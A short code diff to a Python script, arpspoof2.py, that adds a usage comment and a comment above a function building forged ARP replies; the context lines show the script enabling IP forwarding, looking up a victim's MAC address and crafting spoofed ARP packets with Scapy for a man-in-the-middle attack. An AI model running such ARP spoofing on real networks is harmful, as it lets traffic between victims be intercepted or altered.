@@ -4,6 +4,7 @@ import os
 import sys
 
 #./arpspoof2.py eth1 192.168.20.200 192.168.20.201
+#./arpspoof2.py [interface] [target_ip] [victim_ip]
 
 # start ip forward
 os.system('sysctl -w net.ipv4.ip_forward=1')
@@ -24,6 +25,7 @@ victim_mac = os.popen('arp -an | grep %s | grep %s | awk \'{print $4}\''%(victim
 
 tryARP = Ether()/ARP()
 
+# make ARP packet
 def arp_reply(tryARP, target_ip, target_mac, victim_ip, my_mac, interface):
     tryARP.dst = target_mac
     tryARP.src = my_mac
